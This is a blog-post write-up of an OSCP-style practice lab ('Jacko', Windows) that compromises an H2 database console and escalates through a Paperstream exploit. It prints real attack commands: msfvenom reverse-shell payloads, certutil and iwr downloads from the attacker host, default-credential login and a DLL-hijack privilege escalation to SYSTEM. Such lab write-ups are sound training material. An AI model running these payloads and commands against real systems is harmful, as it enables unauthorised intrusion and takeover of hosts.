@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Jacko - Windows :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Box What the actual fuck&hellip; I&rsquo;ll write this up tomorrow, but this was a combination of &ldquo;Why the fuck isn&rsquo;t this working&rdquo; with &ldquo;that is so fucking dumb&rdquo; when it did finally work
+Resolution summary Ran Nmap to identify ports 80, 135/445, 445, 5040, 8082 &amp; 9092 Navigated to port 8082 with browser and logged in with default credentials Found exploit for H2 Database and achieved code execution via SQL Uploaded &amp; executed reverse shell via SQL statements for initial access Identified Paperstream software and found exploit 49382.py Used msfvenom to create reverse shell dll with x86 architecture &amp; xor_dynamic Uploaded dll and 49382.ps1 to target via iwr Ran 49382.ps1 on target and recieved reverse shell as NT-system Improved skills Generating msfvenom payloads Working with Windows kernel exploits (specifically potatos) Used tools nmap python msfvenom powershell Information Gathering Scanned all TCP ports:
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---jacko---windows/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Jacko - Windows">
+<meta property="og:description" content="Box What the actual fuck&hellip; I&rsquo;ll write this up tomorrow, but this was a combination of &ldquo;Why the fuck isn&rsquo;t this working&rdquo; with &ldquo;that is so fucking dumb&rdquo; when it did finally work
+Resolution summary Ran Nmap to identify ports 80, 135/445, 445, 5040, 8082 &amp; 9092 Navigated to port 8082 with browser and logged in with default credentials Found exploit for H2 Database and achieved code execution via SQL Uploaded &amp; executed reverse shell via SQL statements for initial access Identified Paperstream software and found exploit 49382.py Used msfvenom to create reverse shell dll with x86 architecture &amp; xor_dynamic Uploaded dll and 49382.ps1 to target via iwr Ran 49382.ps1 on target and recieved reverse shell as NT-system Improved skills Generating msfvenom payloads Working with Windows kernel exploits (specifically potatos) Used tools nmap python msfvenom powershell Information Gathering Scanned all TCP ports:
+" />
+<meta property="og:url" content="/posts/oscp---jacko---windows/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---jacko---windows/">OSCP - Jacko - Windows</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="box">Box<a href="#box" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>What the actual fuck&hellip; I&rsquo;ll write this up tomorrow, but this was a combination of &ldquo;Why the fuck isn&rsquo;t this working&rdquo; with &ldquo;that is so fucking dumb&rdquo; when it did finally work</p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran Nmap to identify ports <code>80</code>, <code>135/445</code>, <code>445</code>, <code>5040</code>, <code>8082</code> &amp; <code>9092</code></li>
+<li>Navigated to port <code>8082</code> with browser and logged in with default credentials</li>
+<li>Found exploit for <code>H2 Database</code> and achieved code execution via SQL</li>
+<li>Uploaded &amp; executed reverse shell via SQL statements for initial access</li>
+<li>Identified <code>Paperstream</code> software and found exploit <code>49382.py</code></li>
+<li>Used <code>msfvenom</code> to create reverse shell <code>dll</code> with <code>x86</code> architecture &amp; <code>xor_dynamic</code></li>
+<li>Uploaded <code>dll</code> and <code>49382.ps1</code> to target via <code>iwr</code></li>
+<li>Ran <code>49382.ps1</code> on target and recieved reverse shell as <code>NT-system</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Generating msfvenom payloads</li>
+<li>Working with Windows kernel exploits (specifically potatos)</li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>python</li>
+<li>msfvenom</li>
+<li>powershell</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- -T5 -vvv -oN jacko.nmap 192.168.182.66
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE         REASON
+</span></span><span class="line"><span class="cl">80/tcp    open     http            syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">135/tcp   open     msrpc           syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">139/tcp   open     netbios-ssn     syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">445/tcp   open     microsoft-ds    syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">5040/tcp  open     unknown         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">8082/tcp  open     blackice-alerts syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">9092/tcp  open     XmlIpcRegSvc    syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">39980/tcp filtered unknown         no-response
+</span></span><span class="line"><span class="cl">49664/tcp open     unknown         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49665/tcp open     unknown         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49666/tcp open     unknown         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49667/tcp open     unknown         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49668/tcp open     unknown         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49669/tcp open     unknown         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">61417/tcp filtered unknown         no-response
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p 80,135,139,445,5040,8082,9082,61417 -A 192.168.182.66 -oN jacko-ports.nmap -v
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">PORT      STATE  SERVICE       VERSION
+</span></span><span class="line"><span class="cl">80/tcp    open   http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: H2 Database Engine <span class="o">(</span>redirect<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open   msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open   microsoft-ds?
+</span></span><span class="line"><span class="cl">5040/tcp  open   unknown
+</span></span><span class="line"><span class="cl">8082/tcp  open   http          H2 database http console
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: H2 Console
+</span></span><span class="line"><span class="cl">9082/tcp  closed unknown
+</span></span><span class="line"><span class="cl">61417/tcp closed unknown
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
+</span></span><span class="line"><span class="cl">OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.94SVN%E<span class="o">=</span>4%D<span class="o">=</span>10/28%OT<span class="o">=</span>80%CT<span class="o">=</span>9082%CU<span class="o">=</span>41631%PV<span class="o">=</span>Y%DS<span class="o">=</span>4%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>
+</span></span><span class="line"><span class="cl">OS:671F6F8E%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>100%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>I%CI<span class="o">=</span>I%TS<span class="o">=</span>U<span class="o">)</span>S
+</span></span><span class="line"><span class="cl">OS:EQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>101%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>I%CI<span class="o">=</span>I%TS<span class="o">=</span>U<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>101%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10C%TI<span class="o">=</span>I%CI<span class="o">=</span>
+</span></span><span class="line"><span class="cl">OS:I%TS<span class="o">=</span>U<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FF%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>I%CI<span class="o">=</span>I%TS<span class="o">=</span>U<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M578NW8NNS%O2<span class="o">=</span>M578N
+</span></span><span class="line"><span class="cl">OS:W8NNS%O3<span class="o">=</span>M578NW8%O4<span class="o">=</span>M578NW8NNS%O5<span class="o">=</span>M578NW8NNS%O6<span class="o">=</span>M578NNS<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FFFF%W2<span class="o">=</span>F
+</span></span><span class="line"><span class="cl">OS:FFF%W3<span class="o">=</span>FFFF%W4<span class="o">=</span>FFFF%W5<span class="o">=</span>FFFF%W6<span class="o">=</span>FF70<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>FFFF%O<span class="o">=</span>M578NW8NN
+</span></span><span class="line"><span class="cl">OS:S%CC<span class="o">=</span>N%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF
+</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>
+</span></span><span class="line"><span class="cl">OS:%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%
+</span></span><span class="line"><span class="cl">OS:T<span class="o">=</span>80%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Network Distance: <span class="m">4</span> hops
+</span></span><span class="line"><span class="cl">TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">257</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+</span></span><span class="line"><span class="cl">IP ID Sequence Generation: Incremental
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2024-10-28T11:03:30
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-80---http-h2-database">Port 80 - HTTP (H2 Database)<a href="#port-80---http-h2-database" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Navigated to <code>http://192.168.182.66:80</code> and identified default page for <code>H2 Database Engine</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image1.png" alt="OSCP Jacko Windows Image1"></p>
+<h2 id="port-135---msrpc-windows-rpc">Port 135 - MSRPC (Windows RPC)<a href="#port-135---msrpc-windows-rpc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="port-139--445---smb-apache">Port 139 &amp; 445 - SMB (Apache)<a href="#port-139--445---smb-apache" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="port-5040---unknown">Port 5040 - Unknown<a href="#port-5040---unknown" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h2 id="port-8082---h2">Port 8082 - H2<a href="#port-8082---h2" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.194.66:8082</code> and identified <code>H2</code> login
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image2.png" alt="OSCP Jacko Windows Image2"></li>
+<li>Attempted connection with default credentials <code>sa:</code> (No password) and accessed admin panel
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image3.png" alt="OSCP Jacko Windows Image3"></li>
+<li>Ran SQL query <code>SELECT FILE_READ('C:\Windows\system.ini', NULL);</code> to test file read ability
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image4.png" alt="OSCP Jacko Windows Image4"></li>
+<li>
+<h2 id="port-9092---unknown">Port 9092 - Unknown<a href="#port-9092---unknown" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+</li>
+<li>Navigated to <code>http://192.168.194.66:9092</code> and identified unknown service
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image5.png" alt="OSCP Jacko Windows Image5"></li>
+<li>Saved page and displayed with correct encoding
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image6.png" alt="OSCP Jacko Windows Image6"></li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="sql-injection">SQL Injection<a href="#sql-injection" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Ran <code>searchsploit &quot;H2&quot;</code> and identified exploit <code>49384.txt</code> to compile and run Java code on target for code execution
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image7.png" alt="OSCP Jacko Windows Image7"></p>
+<ul>
+<li>Copied Java script from exploit into SQL statement and ran
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image8.png" alt="OSCP Jacko Windows Image8"></li>
+<li>Copied native library script into SQL statement and ran
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image9.png" alt="OSCP Jacko Windows Image9"></li>
+<li>Copied script evaluation into SQL statement and ran with command <code>whoami</code> to test - identified user <code>jacko/tony</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image10.png" alt="OSCP Jacko Windows Image10"></li>
+<li>Ran <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.162 LPORT=4444 -f exe &gt; revshell.exe</code> to create reverse shell executable
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image11.png" alt="OSCP Jacko Windows Image11"></li>
+<li>Ran <code>python3 -m http.server 80</code> to offer <code>revshell.exe</code> on HTTP server</li>
+<li>Returned to SQL statement and edited command to <code>certutil -split -urlcache -f http://192.168.45.162/revshell.exe C:\\Users\\tony\\revshell2.exe</code> to copy reverse shell to user <code>tony</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image12.png" alt="OSCP Jacko Windows Image12"></li>
+<li>Started Netcat listener on port <code>4444</code>, and ran SQL statement with command <code>C:\\Users\\tony\\revshell2.exe</code> and received reverse shell
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image13.png" alt="OSCP Jacko Windows Image13"></li>
+</ul>
+<hr>
+<h1 id="lateral-movement-to-user">Lateral Movement to user<a href="#lateral-movement-to-user" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>type C:\Users\tony\desktop\local.txt</code> to print <code>988d8a67a549358c69a1cab88b594883</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image14.png" alt="OSCP Jacko Windows Image14"></li>
+<li>Navigated to <code>C:\Windows\system32</code> and ran <code>whoami /priv</code> - identified <code>SeImpersonatePrivilege</code> is <code>Enabled</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image15.png" alt="OSCP Jacko Windows Image15"></li>
+<li>Ran <code>systeminfo</code> and identified <code>Windows 10 Build 18363</code> on <code>x64</code> architecture
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image16.png" alt="OSCP Jacko Windows Image16"></li>
+<li>Ran <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code> to fix error with file path
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image17.png" alt="OSCP Jacko Windows Image17"></li>
+<li>Ran <code>powershell -ep bypass</code> to start <code>Powershell</code> with scripts allowed</li>
+</ul>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="paperstream-exploit-1">Paperstream Exploit #1<a href="#paperstream-exploit-1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Enumerated host programs and identified <code>Paperstream IP</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image18.png" alt="OSCP Jacko Windows Image18"></li>
+<li>Ran <code>searchsploit &quot;Paperstream&quot;</code> - identified &amp; copied exploit <code>49382.ps1</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image19.png" alt="OSCP Jacko Windows Image19"></li>
+<li>Updated <code>49382.ps1</code> to save <code>shell.dll</code> to <code>C:\Users\tony\</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image20.png" alt="OSCP Jacko Windows Image20"></li>
+<li>Ran <code>msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.162 LPORT=4444</code> to generate <code>shell.dll</code> file</li>
+<li>Ran <code>iwr -uri http://192.168.45.162/shell.dll -outfile shell.dll</code> &amp; <code>iwr -uri http://192.168.45.162/49382.ps1 -outfile paperstreamexploit.ps1</code> to copy <code>shell.dll</code> &amp; <code>paperstreamexploit.ps1</code> into <code>C:\Users\tony</code> directory from http server
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image21.png" alt="OSCP Jacko Windows Image21"></li>
+<li>Started netcat listener and ran <code>.\paperstreamexploit.ps1</code> - payload triggered but no reverse shell received
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image22.png" alt="OSCP Jacko Windows Image22"></li>
+</ul>
+<h2 id="paperstream-exploit-2">Paperstream Exploit #2<a href="#paperstream-exploit-2" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Referenced <a href="https://benheater.com/proving-grounds-jacko/">https://benheater.com/proving-grounds-jacko/</a></li>
+<li>Ran <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=445 -f dll -a x86 --platform windows -e x86/xor_dynamic -b '\x00' -o 0xBEN_privesc.dll</code> to create new <code>dll</code> on x86 architecture with <code>xor_dynamic</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image23.png" alt="OSCP Jacko Windows Image23"></li>
+<li>Updated <code>49382.ps1</code> to reflect change in <code>dll</code> name</li>
+<li>Ran <code>iwr -uri http://192.168.45.169/0xBEN_privesc.dll -outfile 0xBEN_privesc.dll</code> to copy <code>0xBEN_privesc.dll</code> onto target (via python3 http server)
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image24.png" alt="OSCP Jacko Windows Image24"></li>
+<li>Ran <code>iwr -uri http://192.168.45.169/49382.ps1 -outfile 49382.ps1</code> to copy <code>49382.ps1</code> onto target (via python3 http server)
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image25.png" alt="OSCP Jacko Windows Image25"></li>
+<li>Started netcat listener on port <code>445</code> and then ran <code>.\49382.ps1</code> to execute exploit - received shell as <code>NT-System</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image26.png" alt="OSCP Jacko Windows Image26">
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image27.png" alt="OSCP Jacko Windows Image27"></li>
+<li>Ran <code>type C:\Users\administrator\desktop\proof.txt</code> to print <code>b32d47218e9665058f06833a497a4154</code>
+<img src="/images/OSCP%20-%20Jacko%20-%20Windows%20-%20image28.png" alt="OSCP Jacko Windows Image28"></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>local.txt</code> = <code>988d8a67a549358c69a1cab88b594883</code>
+<code>proof.txt</code> = <code>b32d47218e9665058f06833a497a4154</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---internal---windows/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Internal - Windows</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---kevin---windows-dnf/" class="button inline next">
+         [<span class="button__text">OSCP - Kevin - Windows (DNF)</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
